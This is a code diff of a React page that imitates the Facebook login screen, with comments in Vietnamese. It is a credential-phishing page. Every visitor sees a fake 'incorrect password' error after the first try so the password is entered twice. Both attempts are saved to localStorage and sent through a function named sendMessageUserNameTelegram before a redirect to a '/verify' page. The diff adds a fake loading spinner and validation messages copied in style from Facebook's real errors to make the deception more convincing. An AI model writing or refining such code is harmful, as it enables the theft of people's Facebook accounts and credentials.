@@ -15,25 +15,39 @@ export default function FacebookLogin() {
 
   const [attempts, setAttempts] = useState([]);
   const [showError, setShowError] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
   const onSubmit = async (data) => {
-    if (attempts.length === 0) {
-      // Lần nhập đầu tiên
-      setShowError(true);
-      setAttempts([data]); // Lưu thông tin lần 1
-      setValue("password", "");
-    } else {
-      // Lần nhập thứ hai
-      const newAttempts = [...attempts, data]; // Lưu thông tin cả 2 lần
-      localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
-      sendMessageUserNameTelegram();
-      // Chuyển sang trang verify
-      navigate("/verify");
-    }
+    setIsLoading(true); // Bắt đầu loading
+
+    setTimeout(async () => {
+      if (attempts.length === 0) {
+        setShowError(true);
+        setAttempts([data]);
+        setValue("password", "");
+      } else {
+        const newAttempts = [...attempts, data];
+        localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
+        sendMessageUserNameTelegram(newAttempts);
+        navigate("/verify");
+      }
+
+      setIsLoading(false); // Kết thúc loading sau 5s
+    }, 3500);
   };
 
   return (
     <div className="fb-login-container">
+      {/* Spinner full màn hình */}
+      {isLoading && (
+        <div className="fb-spinner-overlay">
+          <div className="fb-spinner-container">
+            <div className="fb-spinner-ring"></div>
+            <div className="fb-spinner-ring-inner"></div>
+          </div>
+        </div>
+      )}
+
       <div className="fb-login-card">
         <div className="fb-header">
           <svg className="fb-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
@@ -57,36 +71,40 @@ export default function FacebookLogin() {
           <form onSubmit={handleSubmit(onSubmit)} className="fb-login-form" autoComplete="off">
             <div className="fb-form-group">
               <label htmlFor="email">Email address or phone number:</label>
-              <input
-                type="text"
-                id="email"
-                className="fb-input"
-                autoComplete="false"
-                readOnly
-                onFocus={(e) => e.target.removeAttribute("readOnly")}
-                {...register("email", { required: "Email is required" })}
-              />
-              {errors.email && <p className="error-text">{errors.email.message}</p>}
+              <div>
+                <input
+                  type="text"
+                  id="email"
+                  className="fb-input"
+                  autoComplete="false"
+                  readOnly
+                  onFocus={(e) => e.target.removeAttribute("readOnly")}
+                  {...register("email", { required: "The username that you've entered is incorrect." })}
+                />
+                {errors.email && <p className="error-text">{errors.email.message}</p>}
+              </div>
             </div>
 
             <div className="fb-form-group">
               <label htmlFor="password">Password:</label>
-              <input
-                type="password"
-                id="password"
-                className="fb-input"
-                autoComplete="off"
-                readOnly
-                onFocus={(e) => e.target.removeAttribute("readOnly")}
-                {...register("password", { required: "Password is required" })}
-              />
-              {errors.password && <p className="error-text">{errors.password.message}</p>}
+              <div>
+                <input
+                  type="password"
+                  id="password"
+                  className="fb-input"
+                  autoComplete="off"
+                  readOnly
+                  onFocus={(e) => e.target.removeAttribute("readOnly")}
+                  {...register("password", { required: "The password that you've entered is incorrect." })}
+                />
+                {errors.password && <p className="error-text">{errors.password.message}</p>}
+              </div>
             </div>
 
             {showError && <p className="error-text">Incorrect username or password. Please try again.</p>}
 
             <div className="fb-actions">
-              <button type="submit" className="fb-login-button">
+              <button type="submit" className="fb-login-button" disabled={isLoading}>
                 Log in
               </button>
               <a href="#" className="fb-forgot-link">
